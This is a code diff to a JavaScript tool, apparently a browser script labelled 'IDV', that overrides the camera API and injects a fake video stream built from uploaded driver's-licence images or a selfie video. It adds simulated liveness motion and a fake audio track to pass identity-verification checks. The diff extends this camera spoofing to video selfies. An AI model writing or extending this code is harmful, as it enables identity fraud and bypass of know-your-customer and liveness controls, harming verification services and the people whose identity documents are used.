@@ -229,15 +229,31 @@ function livenessYaw(elapsed) {
 
 // ── Build fake video stream ───────────────────────────────────────────────────
 async function buildFakeStream(src) {
-  const img = await loadImg(src)
-  if (!img) return null
+  // Detect if src is a video — if yes, don't try to load it as Image
+  const srcType = srcKind(src)
+  let img = null
+  if (srcType === 'image') {
+    img = await loadImg(src)
+  } else if (srcType === 'video') {
+    // Video selfie case: try to load ID front as static fallback for any non-selfie frames
+    const fallbackSrc = IDV.dlFront || IDV.dlBack
+    if (fallbackSrc) img = await loadImg(fallbackSrc)
+  }
+  // Even without an image we proceed if selfie phase has a video slot
+  const isSelfieVideo = IDV.phase === 'selfie' && getActiveSelfieSlot()?.kind === 'video'
+  if (!img && !isSelfieVideo) {
+    console.log('[IDV] buildFakeStream: no image and no video slot — aborting')
+    return null
+  }
 
   const W = 1280, H = 720
   const canvas = document.createElement('canvas')
   canvas.width = W; canvas.height = H
   const ctx = canvas.getContext('2d')
+  // Paint immediate dark frame so canvas isn't transparent
+  ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
 
-  IDV.currentImg = img
+  if (img) IDV.currentImg = img
   let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
   const streamStart = performance.now()
 
@@ -278,6 +294,13 @@ async function buildFakeStream(src) {
 
   function drawImage() {
     const ci = IDV.currentImg || img
+    if (!ci) {
+      // No image and video not ready yet — just fill dark with "loading…" text
+      ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
+      ctx.fillStyle = '#1e3a5f'; ctx.font = '24px monospace'; ctx.textAlign = 'center'
+      ctx.fillText('⬡ Loading video…', W/2, H/2)
+      return
+    }
     const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * IDV.adjZoom
     ox += vx; oy += vy; sc += vs
     if (Math.abs(ox) > 8)   vx *= -1
@@ -414,25 +437,32 @@ if (_origGUM) {
     const a = PHASE_ADJ[currentPhaseKey()]
     IDV.adjZoom = a.zoom; IDV.adjOffX = a.offX; IDV.adjOffY = a.offY
 
+    // Wait briefly for sources to be available
     for (let i = 0; i < 40; i++) {
-      if (IDV.dlFront) break
+      const slot = getActiveSelfieSlot()
+      const haveSomething = IDV.dlFront || (IDV.phase === 'selfie' && slot)
+      if (haveSomething) break
       const ss = ssGet('__idv_dl_front__')
       if (ss) { IDV.dlFront = ss; break }
       await new Promise(r => setTimeout(r, 200))
     }
 
     const src = pickSrc()
-    if (!src) {
+    const slot = getActiveSelfieSlot()
+    const hasVideoSlot = IDV.phase === 'selfie' && slot?.kind === 'video'
+    if (!src && !hasVideoSlot) {
       showToast('⬡ IDV: Upload images first!', '#7f1d1d')
       return _origGUM(constraints)
     }
 
     showToast('⬡ IDV: Injecting fake camera…', '#1e3a5f')
-    const fake = await buildFakeStream(src)
+    const fake = await buildFakeStream(src || IDV.dlFront)
     if (!fake) {
       showToast('⬡ IDV: Stream failed — real camera', '#7f1d1d')
       return _origGUM(constraints)
     }
+    // Make sure video plays
+    if (hasVideoSlot && slot.vidEl) startSelfieVideo(slot.vidEl)
 
     // If audio requested, attach fake audio track
     if (constraints.audio && fake._fakeAudio) {
